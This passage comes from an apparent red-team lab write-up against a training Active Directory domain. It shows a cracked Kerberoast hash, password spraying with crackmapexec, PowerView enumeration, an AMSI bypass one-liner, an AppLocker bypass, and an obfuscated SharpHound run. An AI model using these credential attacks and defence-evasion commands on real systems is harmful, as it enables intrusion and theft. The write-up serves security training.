<span class="nv">$krb5tgs$23$*</span>svcScanning<span class="nv">$corp</span>.thereserve.loc<span class="nv">$cifs</span>/scvScanning<span class="k">*</span><span class="nv">$3c70f983c9acda432f26512a5a5737a1$a337fb6cc70470fb26daf6dff8f3a13e394043c0f8e20eabfdc0de508aaa344d27289c155b4afdcfe91b69841ed1a734bb9848d9c459acfa8c5403ce6e24d4e84666a786ec8c667cac9bea1a58aee4ad18f0a0fd313096a389d9b87c92a8747c674c5aa116c4a6e5957bc0e4ebec4b535edda0bbffe8bfe8953717c02f3c59b3041e0d6a3ab60915498dfaa12ede45ee126809cb8ae4bdaa5914c54e4f38eb338cc19df5dec384ba5840a9c846d4d570a9f632f2e4cc7d1829242ec437690ef70c0dab8fa99a723df232a3ea7719664afa146afac9915674da4f93e1f4a3c9d5f01563682e158a2e74a4649ea62b7790bd09ff5a5f942ceed23de9680db06c86d5dc02af788295f6b6c300cd007801d507ab2a0cf6aa6cf2e3999d8097bbb75deb7f87493aced88cbb221f23d5ae04a3faba8bfa730dbf29719b589b296c80d1ae80239343c421a5d9d2c61def7c162bb37db39d61ac2ce6a07060537c2d7ff04ac7823facd26642ceec6702f4ced133fc26126f0f9dbdd460a3316c7a29cde1c6f631a9c5ed89b7fb322548d1ad19f4d79e7f43a9f87733b3798e34c0e4faae7055ebf467f7b87885d121324781ca11257783e216cabb9b9725a7938c026cad39fbdf8bf353a3fe814a2214bff2b31dd1a39630bcfd3404c8b36f6118c483d8c13e63fc5ab7bcec54b835eeba7049346449b46ff718df40316bf7ca2597c47bde6d9417fb9b0161a224ff7010e7d61e3a59d6f744f766c1c3d3ec1a663fa56d72acdc615a709bf00e1bfb5da5026ecb6757dc3db03e575f9e9d25fd90e0fe3e0a1601d54ff5d6b5c3c041faef12d88b1f2f45c2969fab93add7ee4252613c7f534c6cd8239533aadbf3741471043559b2627b7ddbd7a818f7400991965cfa723787c41425b5556f1dd29c9351fe23cdba6a24ef13e5f41548a1c9b74f672f8ce68dcae990afe8622bb8db779e5eb75a58dc89e4494bea5e17f309b50e441b69fe805eecd721f6a916a130452d5ae08e8a239dd36868580dc56f67c13457fd5781cc0a970c4e1371090e7a597021d2b7b8b91fdb662a0dbd04b605e551780fc697887b74ccb6c92f8ae83c7d1072fa441ab60a2e44d2a84ab92d0fefb42562d5d794895a75eac77c718e402667d895fe3c3319b7716d334b98289a07a60c8b55c3a215d873a97f6de51ebda290b80c94e64e6e0414c518dabc0912fb7f64988577bab69e36e291e6cebf88b35c07d560a78b74965e6931638b03f438c50ea4045d6ec3d239e5ac2bc7e7de665c2cdf6dac536547e8a1beea225cb55c9886a10a099e9af9f77dcdcd3956fa7b227fdf244f3f7a1fd8104e4fcd913c9d604d90ced1b78c0d1684dfb8c5f9fd2a415992d8fb73c63812ed00ad2d399a984db389ecb33bd91ae6e63f2f748d0299ef658058d7b381fd45545b6bf1bfb15e9f9e81a215db7244939918ed30981abf017301724c75ba183974302432b56a0d5805f479d177cd1be6b960f6fc328bf665659baf0757801eec8a367cb2d81db650853d68e992686a8abb47b071d3e75d0a17fb46fd774263c038278a29dd0986a2ccaccc63fd94b9a697834374f62c04c1cc514171a7bc70d6612fa86de41d171fb0d297197f87a97f36aed024a2c730380edcb56b6487d846a191ea491706c5a4542afe75701f165a8652255cfd26829f9abf4e38116f42defd798055b464ccba3287c767041eeb54d5004047bedc5316423f2fddc79368a8f6a27a748df20b</span>:<span class="k">**</span>Password1!<span class="k">**</span>
</pre></table></code></div></div><p>Also, another way that I have tried is doing password spraying. As we have two valid passwords, we can use them against all enumerated users.</p><h3 id="password-spraying-1"><strong>Password Spraying</strong></h3><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nv">$ </span>crackmapexec smb 10.200.x.21 <span class="nt">-u</span> All_users.txt <span class="nt">-p</span> valid_passwords <span class="nt">--continue-on-success</span>
SMB         10.200.x.21   445    WRK1             <span class="o">[</span>+] corp.thereserve.loc<span class="se">\s</span>vcScanning:Password1!
</pre></table></code></div></div><h3 id="bloodhound"><strong>BloodHound</strong></h3><p>After we have pawned this user, let’s gather more info about it so we can identify how we are going to use it further.</p><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
</pre><td class="rouge-code"><pre><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\mohammad.ahmed</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Get-DomainUser</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="nx">svcScanning</span><span class="w">
</span><span class="n">logoncount</span><span class="w">            </span><span class="p">:</span><span class="w"> </span><span class="nx">1</span><span class="w">
</span><span class="n">badpasswordtime</span><span class="w">       </span><span class="p">:</span><span class="w"> </span><span class="nx">5/22/2024</span><span class="w"> </span><span class="nx">3:23:24</span><span class="w"> </span><span class="nx">PM</span><span class="w">
</span><span class="n">distinguishedname</span><span class="w">     </span><span class="p">:</span><span class="w"> </span><span class="nx">CN</span><span class="o">=</span><span class="n">svcScanning</span><span class="p">,</span><span class="nx">OU</span><span class="o">=</span><span class="n">Services</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">corp</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">thereserve</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">loc</span><span class="w">
</span><span class="nx">objectclass</span><span class="w">           </span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="n">top</span><span class="p">,</span><span class="w"> </span><span class="nx">person</span><span class="p">,</span><span class="w"> </span><span class="nx">organizationalPerson</span><span class="p">,</span><span class="w"> </span><span class="nx">user</span><span class="p">}</span><span class="w">
</span><span class="n">displayname</span><span class="w">           </span><span class="p">:</span><span class="w"> </span><span class="nx">svcScanning</span><span class="w">
</span><span class="n">lastlogontimestamp</span><span class="w">    </span><span class="p">:</span><span class="w"> </span><span class="nx">5/22/2024</span><span class="w"> </span><span class="nx">9:19:59</span><span class="w"> </span><span class="nx">AM</span><span class="w">
</span><span class="n">userprincipalname</span><span class="w">     </span><span class="p">:</span><span class="w"> </span><span class="nx">svcScanning</span><span class="err">@</span><span class="nx">corp.thereserve.loc</span><span class="w">
</span><span class="n">name</span><span class="w">                  </span><span class="p">:</span><span class="w"> </span><span class="nx">svcScanning</span><span class="w">
</span><span class="n">objectsid</span><span class="w">             </span><span class="p">:</span><span class="w"> </span><span class="nx">S-1-5-21-170228521-1485475711-3199862024-1986</span><span class="w">
</span><span class="n">samaccountname</span><span class="w">        </span><span class="p">:</span><span class="w"> </span><span class="nx">svcScanning</span><span class="w">
</span><span class="n">codepage</span><span class="w">              </span><span class="p">:</span><span class="w"> </span><span class="nx">0</span><span class="w">
</span><span class="n">samaccounttype</span><span class="w">        </span><span class="p">:</span><span class="w"> </span><span class="nx">USER_OBJECT</span><span class="w">
</span><span class="n">accountexpires</span><span class="w">        </span><span class="p">:</span><span class="w"> </span><span class="nx">NEVER</span><span class="w">
</span><span class="n">countrycode</span><span class="w">           </span><span class="p">:</span><span class="w"> </span><span class="nx">0</span><span class="w">
</span><span class="n">whenchanged</span><span class="w">           </span><span class="p">:</span><span class="w"> </span><span class="nx">5/22/2024</span><span class="w"> </span><span class="nx">9:19:59</span><span class="w"> </span><span class="nx">AM</span><span class="w">
</span><span class="n">instancetype</span><span class="w">          </span><span class="p">:</span><span class="w"> </span><span class="nx">4</span><span class="w">
</span><span class="n">usncreated</span><span class="w">            </span><span class="p">:</span><span class="w"> </span><span class="nx">341680</span><span class="w">
</span><span class="n">objectguid</span><span class="w">            </span><span class="p">:</span><span class="w"> </span><span class="nx">baaf37c3-6507-4314-9ef9-a7012be29c74</span><span class="w">
</span><span class="n">lastlogoff</span><span class="w">            </span><span class="p">:</span><span class="w"> </span><span class="nx">1/1/1601</span><span class="w"> </span><span class="nx">12:00:00</span><span class="w"> </span><span class="nx">AM</span><span class="w">
</span><span class="n">objectcategory</span><span class="w">        </span><span class="p">:</span><span class="w"> </span><span class="nx">CN</span><span class="o">=</span><span class="n">Person</span><span class="p">,</span><span class="nx">CN</span><span class="o">=</span><span class="n">Schema</span><span class="p">,</span><span class="nx">CN</span><span class="o">=</span><span class="kr">Configuration</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">thereserve</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">loc</span><span class="w">
</span><span class="nx">dscorepropagationdata</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="mi">3</span><span class="n">/20/2023</span><span class="w"> </span><span class="nx">5:01:14</span><span class="w"> </span><span class="nx">PM</span><span class="p">,</span><span class="w"> </span><span class="nx">2/15/2023</span><span class="w"> </span><span class="nx">9:07:06</span><span class="w"> </span><span class="nx">AM</span><span class="p">,</span><span class="w"> </span><span class="nx">1/1/1601</span><span class="w"> </span><span class="nx">12:00:01</span><span class="w"> </span><span class="nx">AM</span><span class="p">}</span><span class="w">
</span><span class="n">serviceprincipalname</span><span class="w">  </span><span class="p">:</span><span class="w"> </span><span class="nx">cifs/scvScanning</span><span class="w">
</span><span class="n">givenname</span><span class="w">             </span><span class="p">:</span><span class="w"> </span><span class="nx">svcScanning</span><span class="w">
</span><span class="n">memberof</span><span class="w">              </span><span class="p">:</span><span class="w"> </span><span class="nx">CN</span><span class="o">=</span><span class="n">Services</span><span class="p">,</span><span class="nx">OU</span><span class="o">=</span><span class="n">Groups</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">corp</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">thereserve</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">loc</span><span class="w">
</span><span class="nx">lastlogon</span><span class="w">             </span><span class="p">:</span><span class="w"> </span><span class="nx">5/22/2024</span><span class="w"> </span><span class="nx">3:23:26</span><span class="w"> </span><span class="nx">PM</span><span class="w">
</span><span class="n">badpwdcount</span><span class="w">           </span><span class="p">:</span><span class="w"> </span><span class="nx">0</span><span class="w">
</span><span class="n">cn</span><span class="w">                    </span><span class="p">:</span><span class="w"> </span><span class="nx">svcScanning</span><span class="w">
</span><span class="n">useraccountcontrol</span><span class="w">    </span><span class="p">:</span><span class="w"> </span><span class="nx">NORMAL_ACCOUNT</span><span class="p">,</span><span class="w"> </span><span class="nx">DONT_EXPIRE_PASSWORD</span><span class="w">
</span><span class="n">whencreated</span><span class="w">           </span><span class="p">:</span><span class="w"> </span><span class="nx">2/15/2023</span><span class="w"> </span><span class="nx">9:07:06</span><span class="w"> </span><span class="nx">AM</span><span class="w">
</span><span class="n">primarygroupid</span><span class="w">        </span><span class="p">:</span><span class="w"> </span><span class="nx">513</span><span class="w">
</span><span class="n">pwdlastset</span><span class="w">            </span><span class="p">:</span><span class="w"> </span><span class="nx">2/15/2023</span><span class="w"> </span><span class="nx">9:07:06</span><span class="w"> </span><span class="nx">AM</span><span class="w">
</span><span class="n">usnchanged</span><span class="w">            </span><span class="p">:</span><span class="w"> </span><span class="nx">1172549</span><span class="w">

</span><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\mohammad.ahmed</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Get-DomainGroup</span><span class="w"> </span><span class="nt">-userName</span><span class="w"> </span><span class="s1">'svcScanning'</span><span class="w">
</span><span class="n">usncreated</span><span class="w">            </span><span class="p">:</span><span class="w"> </span><span class="nx">341777</span><span class="w">
</span><span class="n">grouptype</span><span class="w">             </span><span class="p">:</span><span class="w"> </span><span class="nx">GLOBAL_SCOPE</span><span class="p">,</span><span class="w"> </span><span class="nx">SECURITY</span><span class="w">
</span><span class="n">samaccounttype</span><span class="w">        </span><span class="p">:</span><span class="w"> </span><span class="nx">GROUP_OBJECT</span><span class="w">
</span><span class="n">samaccountname</span><span class="w">        </span><span class="p">:</span><span class="w"> </span><span class="nx">Services</span><span class="w">
</span><span class="n">whenchanged</span><span class="w">           </span><span class="p">:</span><span class="w"> </span><span class="nx">2/15/2023</span><span class="w"> </span><span class="nx">9:42:50</span><span class="w"> </span><span class="nx">AM</span><span class="w">
</span><span class="n">objectsid</span><span class="w">             </span><span class="p">:</span><span class="w"> </span><span class="nx">S-1-5-21-170228521-1485475711-3199862024-1988</span><span class="w">
</span><span class="n">objectclass</span><span class="w">           </span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="n">top</span><span class="p">,</span><span class="w"> </span><span class="nx">group</span><span class="p">}</span><span class="w">
</span><span class="n">cn</span><span class="w">                    </span><span class="p">:</span><span class="w"> </span><span class="nx">Services</span><span class="w">
</span><span class="n">usnchanged</span><span class="w">            </span><span class="p">:</span><span class="w"> </span><span class="nx">342199</span><span class="w">
</span><span class="n">dscorepropagationdata</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="mi">3</span><span class="n">/20/2023</span><span class="w"> </span><span class="nx">5:01:14</span><span class="w"> </span><span class="nx">PM</span><span class="p">,</span><span class="w"> </span><span class="nx">1/1/1601</span><span class="w"> </span><span class="nx">12:00:01</span><span class="w"> </span><span class="nx">AM</span><span class="p">}</span><span class="w">
</span><span class="n">name</span><span class="w">                  </span><span class="p">:</span><span class="w"> </span><span class="nx">Services</span><span class="w">
</span><span class="n">distinguishedname</span><span class="w">     </span><span class="p">:</span><span class="w"> </span><span class="nx">CN</span><span class="o">=</span><span class="n">Services</span><span class="p">,</span><span class="nx">OU</span><span class="o">=</span><span class="n">Groups</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">corp</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">thereserve</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">loc</span><span class="w">
</span><span class="nx">member</span><span class="w">                </span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="n">CN</span><span class="o">=</span><span class="n">svcScanning</span><span class="p">,</span><span class="nx">OU</span><span class="o">=</span><span class="n">Services</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">corp</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">thereserve</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">loc</span><span class="p">,</span><span class="w"> </span><span class="nx">CN</span><span class="o">=</span><span class="n">svcMonitor</span><span class="p">,</span><span class="nx">OU</span><span class="o">=</span><span class="n">Services</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">corp</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">thereserve</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">loc</span><span class="p">,</span><span class="w"> </span><span class="nx">CN</span><span class="o">=</span><span class="n">svcEDR</span><span class="p">,</span><span class="nx">OU</span><span class="o">=</span><span class="n">Services</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">corp</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">thereserve</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">loc</span><span class="p">,</span><span class="w"> </span><span class="nx">CN</span><span class="o">=</span><span class="n">svcBackups</span><span class="p">,</span><span class="nx">OU</span><span class="o">=</span><span class="n">Services</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">corp</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">thereserve</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">loc</span><span class="p">}</span><span class="w">
</span><span class="n">whencreated</span><span class="w">           </span><span class="p">:</span><span class="w"> </span><span class="nx">2/15/2023</span><span class="w"> </span><span class="nx">9:09:35</span><span class="w"> </span><span class="nx">AM</span><span class="w">
</span><span class="n">instancetype</span><span class="w">          </span><span class="p">:</span><span class="w"> </span><span class="nx">4</span><span class="w">
</span><span class="n">objectguid</span><span class="w">            </span><span class="p">:</span><span class="w"> </span><span class="nx">c27deed9-dd22-4990-bd6f-54275906435f</span><span class="w">
</span><span class="n">objectcategory</span><span class="w">        </span><span class="p">:</span><span class="w"> </span><span class="nx">CN</span><span class="o">=</span><span class="n">Group</span><span class="p">,</span><span class="nx">CN</span><span class="o">=</span><span class="n">Schema</span><span class="p">,</span><span class="nx">CN</span><span class="o">=</span><span class="kr">Configuration</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">thereserve</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">loc</span><span class="w">

</span><span class="n">usncreated</span><span class="w">             </span><span class="p">:</span><span class="w"> </span><span class="nx">12318</span><span class="w">
</span><span class="n">grouptype</span><span class="w">              </span><span class="p">:</span><span class="w"> </span><span class="nx">GLOBAL_SCOPE</span><span class="p">,</span><span class="w"> </span><span class="nx">SECURITY</span><span class="w">
</span><span class="n">samaccounttype</span><span class="w">         </span><span class="p">:</span><span class="w"> </span><span class="nx">GROUP_OBJECT</span><span class="w">
</span><span class="n">samaccountname</span><span class="w">         </span><span class="p">:</span><span class="w"> </span><span class="nx">Domain</span><span class="w"> </span><span class="nx">Users</span><span class="w">
</span><span class="n">whenchanged</span><span class="w">            </span><span class="p">:</span><span class="w"> </span><span class="nx">9/7/2022</span><span class="w"> </span><span class="nx">8:58:08</span><span class="w"> </span><span class="nx">PM</span><span class="w">
</span><span class="n">objectsid</span><span class="w">              </span><span class="p">:</span><span class="w"> </span><span class="nx">S-1-5-21-170228521-1485475711-3199862024-513</span><span class="w">
</span><span class="n">objectclass</span><span class="w">            </span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="n">top</span><span class="p">,</span><span class="w"> </span><span class="nx">group</span><span class="p">}</span><span class="w">
</span><span class="n">cn</span><span class="w">                     </span><span class="p">:</span><span class="w"> </span><span class="nx">Domain</span><span class="w"> </span><span class="nx">Users</span><span class="w">
</span><span class="n">usnchanged</span><span class="w">             </span><span class="p">:</span><span class="w"> </span><span class="nx">12320</span><span class="w">
</span><span class="n">dscorepropagationdata</span><span class="w">  </span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="mi">3</span><span class="n">/20/2023</span><span class="w"> </span><span class="nx">5:01:14</span><span class="w"> </span><span class="nx">PM</span><span class="p">,</span><span class="w"> </span><span class="nx">9/7/2022</span><span class="w"> </span><span class="nx">8:58:09</span><span class="w"> </span><span class="nx">PM</span><span class="p">,</span><span class="w"> </span><span class="nx">1/1/1601</span><span class="w"> </span><span class="nx">12:04:17</span><span class="w"> </span><span class="nx">AM</span><span class="p">}</span><span class="w">
</span><span class="n">memberof</span><span class="w">               </span><span class="p">:</span><span class="w"> </span><span class="nx">CN</span><span class="o">=</span><span class="n">Users</span><span class="p">,</span><span class="nx">CN</span><span class="o">=</span><span class="n">Builtin</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">corp</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">thereserve</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">loc</span><span class="w">
</span><span class="nx">iscriticalsystemobject</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="nx">True</span><span class="w">
</span><span class="n">description</span><span class="w">            </span><span class="p">:</span><span class="w"> </span><span class="nx">All</span><span class="w"> </span><span class="nx">domain</span><span class="w"> </span><span class="nx">users</span><span class="w">
</span><span class="n">distinguishedname</span><span class="w">      </span><span class="p">:</span><span class="w"> </span><span class="nx">CN</span><span class="o">=</span><span class="n">Domain</span><span class="w"> </span><span class="nx">Users</span><span class="p">,</span><span class="nx">CN</span><span class="o">=</span><span class="n">Users</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">corp</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">thereserve</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">loc</span><span class="w">
</span><span class="nx">name</span><span class="w">                   </span><span class="p">:</span><span class="w"> </span><span class="nx">Domain</span><span class="w"> </span><span class="nx">Users</span><span class="w">
</span><span class="n">whencreated</span><span class="w">            </span><span class="p">:</span><span class="w"> </span><span class="nx">9/7/2022</span><span class="w"> </span><span class="nx">8:58:08</span><span class="w"> </span><span class="nx">PM</span><span class="w">
</span><span class="n">instancetype</span><span class="w">           </span><span class="p">:</span><span class="w"> </span><span class="nx">4</span><span class="w">
</span><span class="n">objectguid</span><span class="w">             </span><span class="p">:</span><span class="w"> </span><span class="nx">31be5ca3-8646-4475-a349-e009ef75cb92</span><span class="w">
</span><span class="n">objectcategory</span><span class="w">         </span><span class="p">:</span><span class="w"> </span><span class="nx">CN</span><span class="o">=</span><span class="n">Group</span><span class="p">,</span><span class="nx">CN</span><span class="o">=</span><span class="n">Schema</span><span class="p">,</span><span class="nx">CN</span><span class="o">=</span><span class="kr">Configuration</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">thereserve</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">loc</span><span class="w">
</span></pre></table></code></div></div><p>I think this manual enumeration will be a bit difficult. Let’s try bloodhound to gain a better view. As our compromised workstations have Windows Defender enabled, we have to find a way to run Sharphound script to get our loot.</p><p><strong>AV Evasion</strong></p><p>Found an obfuscated version of Sharphound that worked with me in this repo: <a href="https://github.com/Flangvik/ObfuscatedSharpCollection/tree/main">GitHub - Flangvik/ObfuscatedSharpCollection</a></p><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
</pre><td class="rouge-code"><pre><span class="c"># AMSI Bypass</span><span class="w">
</span><span class="n">PS</span><span class="w"> </span><span class="nx">C:\</span><span class="err">&gt;</span><span class="w"> </span><span class="nv">$v</span><span class="o">=</span><span class="p">[</span><span class="n">Ref</span><span class="p">]</span><span class="o">.</span><span class="nf">Assembly</span><span class="o">.</span><span class="nf">GetType</span><span class="p">(</span><span class="s1">'System.Management.Automation.Am'</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">'siUtils'</span><span class="p">);</span><span class="w"> </span><span class="nv">$v</span><span class="o">.</span><span class="s2">"Get</span><span class="se">`F</span><span class="s2">ie</span><span class="se">`l</span><span class="s2">d"</span><span class="p">(</span><span class="s1">'ams'</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">'iInitFailed'</span><span class="p">,</span><span class="s1">'NonPublic,Static'</span><span class="p">)</span><span class="o">.</span><span class="s2">"Set</span><span class="se">`V</span><span class="s2">al</span><span class="se">`u</span><span class="s2">e"</span><span class="p">(</span><span class="bp">$null</span><span class="p">,</span><span class="bp">$true</span><span class="p">)</span><span class="w">

</span><span class="c"># APP Locker Bypass</span><span class="w">
</span><span class="n">PS</span><span class="w"> </span><span class="nx">C:\</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">cd</span><span class="w"> </span><span class="nx">C:\Windows\Tasks</span><span class="w">
</span><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Windows\Tasks</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">cp</span><span class="w"> </span><span class="nx">\\tsclient\share\ss.exe</span><span class="w"> </span><span class="o">.</span><span class="w">

</span><span class="c"># Running the obfuscated Script</span><span class="w">
</span><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Windows\Tasks</span><span class="err">&gt;</span><span class="w"> </span><span class="o">.</span><span class="nx">/ss.exe</span><span class="w"> </span><span class="nt">--CollectionMethods</span><span class="w"> </span><span class="nx">All</span><span class="w">
</span><span class="mi">2024</span><span class="nt">-06-27T19</span><span class="p">:</span><span class="mi">13</span><span class="p">:</span><span class="mf">37.2636725</span><span class="o">+</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="o">|</span><span class="n">INFORMATION</span><span class="o">|</span><span class="n">Resolved</span><span class="w"> </span><span class="nx">Collection</span><span class="w"> </span><span class="nx">Methods:</span><span class="w"> </span><span class="nx">Group</span><span class="p">,</span><span class="w"> </span><span class="nx">LocalAdmin</span><span class="p">,</span><span class="w"> </span><span class="nx">GPOLocalGroup</span><span class="p">,</span><span class="w"> </span><span class="nx">Session</span><span class="p">,</span><span class="w"> </span><span class="nx">LoggedOn</span><span class="p">,</span><span class="w"> </span><span class="nx">Trusts</span><span class="p">,</span><span class="w"> </span><span class="nx">ACL</span><span class="p">,</span><span class="w"> </span><span class="nx">Container</span><span class="p">,</span><span class="w"> </span><span class="nx">RDP</span><span class="p">,</span><span class="w"> </span><span class="nx">ObjectProps</span><span class="p">,</span><span class="w"> </span><span class="nx">DCOM</span><span class="p">,</span><span class="w"> </span><span class="nx">SPNTargets</span><span class="p">,</span><span class="w"> </span><span class="nx">PSRemote</span><span class="w">
</span><span class="mi">2024</span><span class="nt">-06-27T19</span><span class="p">:</span><span class="mi">13</span><span class="p">:</span><span class="mf">37.4635801</span><span class="o">+</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="o">|</span><span class="n">INFORMATION</span><span class="o">|</span><span class="n">Initializing</span><span class="w"> </span><span class="nx">SharpHound</span><span class="w"> </span><span class="nx">at</span><span class="w"> </span><span class="nx">7:13</span><span class="w"> </span><span class="nx">PM</span><span class="w"> </span><span class="nx">on</span><span class="w"> </span><span class="nx">6/27/2024</span><span class="w">
</span><span class="mi">2024</span><span class="nt">-06-27T19</span><span class="p">:</span><span class="mi">13</span><span class="p">:</span><span class="mf">37.8699076</span><span class="o">+</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="o">|</span><span class="n">INFORMATION</span><span class="o">|</span><span class="p">[</span><span class="n">CommonLib</span><span class="w"> </span><span class="n">LDAPUtils</span><span class="p">]</span><span class="n">Found</span><span class="w"> </span><span class="nx">usable</span><span class="w"> </span><span class="nx">Domain</span><span class="w"> </span><span class="nx">Controller</span><span class="w"> </span><span class="nx">for</span><span class="w"> </span><span class="nx">corp.thereserve.loc</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="nx">CORPDC.corp.thereserve.loc</span><span class="w">
</span><span class="mi">2024</span><span class="nt">-06-27T19</span><span class="p">:</span><span class="mi">13</span><span class="p">:</span><span class="mf">38.0105192</span><span class="o">+</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="o">|</span><span class="n">INFORMATION</span><span class="o">|</span><span class="n">Flags:</span><span class="w"> </span><span class="nx">Group</span><span class="p">,</span><span class="w"> </span><span class="nx">LocalAdmin</span><span class="p">,</span><span class="w"> </span><span class="nx">GPOLocalGroup</span><span class="p">,</span><span class="w"> </span><span class="nx">Session</span><span class="p">,</span><span class="w"> </span><span class="nx">LoggedOn</span><span class="p">,</span><span class="w"> </span><span class="nx">Trusts</span><span class="p">,</span><span class="w"> </span><span class="nx">ACL</span><span class="p">,</span><span class="w"> </span><span class="nx">Container</span><span class="p">,</span><span class="w"> </span><span class="nx">RDP</span><span class="p">,</span><span class="w"> </span><span class="nx">ObjectProps</span><span class="p">,</span><span class="w"> </span><span class="nx">DCOM</span><span class="p">,</span><span class="w"> </span><span class="nx">SPNTargets</span><span class="p">,</span><span class="w"> </span><span class="nx">PSRemote</span><span class="w">
</span><span class="mi">2024</span><span class="nt">-06-27T19</span><span class="p">:</span><span class="mi">13</span><span class="p">:</span><span class="mf">38.4565794</span><span class="o">+</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="o">|</span><span class="n">INFORMATION</span><span class="o">|</span><span class="n">Beginning</span><span class="w"> </span><span class="nx">LDAP</span><span class="w"> </span><span class="nx">search</span><span class="w"> </span><span class="nx">for</span><span class="w"> </span><span class="nx">corp.thereserve.loc</span><span class="w">
</span><span class="mi">2024</span><span class="nt">-06-27T19</span><span class="p">:</span><span class="mi">13</span><span class="p">:</span><span class="mf">39.2845578</span><span class="o">+</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="o">|</span><span class="n">INFORMATION</span><span class="o">|</span><span class="n">Producer</span><span class="w"> </span><span class="nx">has</span><span class="w"> </span><span class="nx">finished</span><span class="p">,</span><span class="w"> </span><span class="nx">closing</span><span class="w"> </span><span class="nx">LDAP</span><span class="w"> </span><span class="nx">channel</span><span class="w">
</span><span class="mi">2024</span><span class="nt">-06-27T19</span><span class="p">:</span><span class="mi">13</span><span class="p">:</span><span class="mf">39.2845578</span><span class="o">+</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="o">|</span><span class="n">INFORMATION</span><span class="o">|</span><span class="n">LDAP</span><span class="w"> </span><span class="nx">channel</span><span class="w"> </span><span class="nx">closed</span><span class="p">,</span><span class="w"> </span><span class="nx">waiting</span><span class="w"> </span><span class="nx">for</span><span class="w"> </span><span class="nx">consumers</span><span class="w">
